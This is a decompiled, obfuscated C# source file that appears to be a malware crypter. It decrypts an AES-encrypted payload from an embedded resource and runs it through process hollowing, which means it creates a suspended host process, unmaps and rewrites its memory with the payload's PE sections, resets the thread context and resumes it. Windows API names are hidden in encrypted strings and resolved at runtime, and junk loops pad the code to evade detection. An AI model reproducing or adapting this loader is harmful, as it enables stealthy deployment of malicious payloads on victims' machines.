using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class0
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr u8, bool bool_0, int int_0, IntPtr p, string string_2, byte[] byte_0, IntPtr[] intptr_1);

	public delegate bool tc(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate1(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr u8, ref IntPtr intptr_3);

	public delegate uint Delegate2(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate3(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int u8, int int_0);

	public delegate bool gm(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr u8, ref IntPtr intptr_2);

	public delegate int Delegate4(IntPtr intptr_0);

	public static byte[] smethod_0(byte[] wp, long long_0)
	{
		byte[] array = new byte[15]
		{
			206, 97, 91, 156, 253, 88, 186, 129, 136, 174,
			225, 47, 201, 58, 39
		};
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(array, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
		return rijndaelManaged.CreateDecryptor().TransformFinalBlock(wp, 0, wp.Length);
	}

	public static string smethod_1(string c, uint uint_0)
	{
		return Encoding.UTF8.GetString(smethod_0(Convert.FromBase64String(c), 1512379173L));
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public static T smethod_2<T>(DateTime dateTime_0, ulong ulong_0, decimal decimal_0, string d, DateTime dateTime_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandleA(ref d.Split(new char[1] { Convert.ToChar(58) })[0]), ref d.Split(new char[1] { Convert.ToChar(58) })[1]), typeof(T));
	}

	public static void smethod_3(byte[] byte_0, sbyte sbyte_0)
	{
		int num = 0;
		do
		{
			num++;
		}
		while (num <= 100);
		short num2 = 2302;
		string string_ = Assembly.GetEntryAssembly()!.Location;
		byte b = 0;
		do
		{
			for (int i = b; i <= 30 && i != 25; i++)
			{
			}
			b = (byte)(b + 1);
		}
		while ((uint)b <= 20u);
		if (Directory.Exists(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("nSkChCds2qv3TVaa6W3qPprkNZ8kAcKbT04ykaHg8ME=", 1183608974u)))
		{
			string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("V22hRDX1p+lyBMIFCpHZboZcX3ZXbkweDbIdf8RWRb6qrYz61Tj5y3a3fElEJ4tZ", 848136793u));
			foreach (string text in directories)
			{
				if (!text.Contains(smethod_1("gQQtFCUUJj99bL0F2VJ/Sg==", 0u)))
				{
					num2 = (short)(num2 + 1);
					continue;
				}
				string_ = text + smethod_1("DY4GqdoQG+fKKrO61WfQnA==", 1157344585u);
				Guid.NewGuid();
				break;
			}
		}
		byte[] array = new byte[6] { 0, 1, 2, 3, 4, 5 };
		int[] array2 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
		int num3 = BitConverter.ToInt32(byte_0, 60);
		int num4 = BitConverter.ToInt16(byte_0, num3 + 6);
		IntPtr u = new IntPtr(BitConverter.ToInt32(byte_0, num3 + 84));
		IntPtr[] array3 = new IntPtr[4];
		IntPtr intPtr = default(IntPtr);
		if (!smethod_2<Delegate0>(DateTime.Now, 659650509uL, new decimal(1100982880L), smethod_1("3I2Yc0dpNW5CpQaL6oaS3NY7tcF5PcfymMURcBP4py0=", 1533651088u), DateTime.Now)(null, string_, intPtr, intPtr, bool_0: false, 4, intPtr, null, new byte[0], array3))
		{
			return;
		}
		try
		{
			uint[] array4 = new uint[179];
			array4[0] = 65538u;
			if (smethod_2<tc>(DateTime.Now, 1372037236uL, new decimal(846407122L), smethod_1("vk/tP5MEBWceNgESQgaUDeQhhwWrrqQLxtDuA3nqtaM=", 536983014u), DateTime.Now)(array3[1], array4))
			{
				Delegate1 @delegate = smethod_2<Delegate1>(DateTime.Now, 1205618221uL, new decimal(2146044429L), smethod_1("zz+9O3j8VO/oj/nGPmXy5G7611umaSrGGKiuBYMt22k=", 1974491982u), DateTime.Now);
				IntPtr intptr_ = array3[0];
				IntPtr intptr_2 = new IntPtr((long)array4[41] + 8L);
				IntPtr u2 = new IntPtr(4);
				IntPtr intptr_3 = default(IntPtr);
				IntPtr intptr_4 = default(IntPtr);
				if (@delegate(intptr_, intptr_2, ref intptr_3, u2, ref intptr_4) && (long)smethod_2<Delegate2>(DateTime.Now, 407992492uL, new decimal(1220478605L), smethod_1("RC7hxpFv8fGn/U5MvYgL0lHXFNvxRT9FNnmfdZR3+98=", 948867298u), DateTime.Now)(array3[0], intptr_3) == 0L)
				{
					Delegate3 delegate2 = smethod_2<Delegate3>(DateTime.MinValue, 943919211uL, new decimal(129903580L), smethod_1("PMhR2MFAXJcqBHo07Yj44sNDhV/CQxmMZmYbtwTjpHI=", 1711954922u), DateTime.MinValue);
					IntPtr intptr_5 = array3[0];
					IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(byte_0, num3 + 52));
					IntPtr intptr_6 = intPtr2;
					IntPtr intptr_7 = new IntPtr(BitConverter.ToInt32(byte_0, num3 + 80));
					IntPtr intptr_8 = delegate2(intptr_5, intptr_6, intptr_7, 12288, 64);
					gm gm = smethod_2<gm>(DateTime.Now, 0uL, new decimal(1875832596L), smethod_1("EF1mChrpjHPu+CXvJCOWbXe59YIXiWelqeP4U8znKCo=", 1510882009u), DateTime.Now);
					gm(array3[0], intptr_8, byte_0, u, ref intptr_4);
					int[] array5 = new int[10];
					int num5 = num4 - 1;
					for (int k = 0; k <= num5; k++)
					{
						array5[0] = 15;
						array5[5] = 223 + array5[0];
						Buffer.BlockCopy(byte_0, num3 + 248 + k * 40, array5, 0, 40);
						byte[] array6 = new byte[array5[4] - 1 + 1];
						array5.Length.ToString();
						Buffer.BlockCopy(byte_0, array5[5], array6, 0, array6.Length);
						IntPtr intptr_9 = array3[0];
						intptr_7 = new IntPtr(intptr_8.ToInt32() + array5[3]);
						IntPtr intptr_10 = intptr_7;
						intPtr2 = new IntPtr(array6.Length);
						gm(intptr_9, intptr_10, array6, intPtr2, ref intptr_4);
					}
					IntPtr intptr_11 = array3[0];
					intptr_7 = new IntPtr((long)array4[41] + 8L);
					IntPtr intptr_12 = intptr_7;
					byte[] bytes = BitConverter.GetBytes(intptr_8.ToInt32());
					intPtr2 = new IntPtr(4);
					gm(intptr_11, intptr_12, bytes, intPtr2, ref intptr_4);
					array4[44] = (uint)(intptr_8.ToInt32() + BitConverter.ToInt32(byte_0, num3 + 40));
					smethod_2<tc>(DateTime.Now, 854883155uL, new decimal(-191390358L), smethod_1("5w484C2btFFK5vWMmbMj7so9mo3l2VChk7uR0lz1/J4=", 313612901u), DateTime.MinValue)(array3[1], array4);
					smethod_2<Delegate4>(DateTime.MinValue, 2104026588uL, new decimal(-411370650L), smethod_1("uAVU0vbCmI/v+N5/8/xWyfxJt+oDoMPnA8rxg27vUXY=", 1300306431u), DateTime.Now)(array3[1]);
					return;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Process.GetProcessById(array3[2].ToInt32()).Kill();
	}

	[STAThread]
	public static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("zoxliahl", Assembly.GetExecutingAssembly());
		smethod_3(smethod_0((byte[])resourceManager.GetObject(smethod_1("HKzM8nNXETytZYpyiCRElg==", 836092004u)), 1575746318L), -93);
	}
}
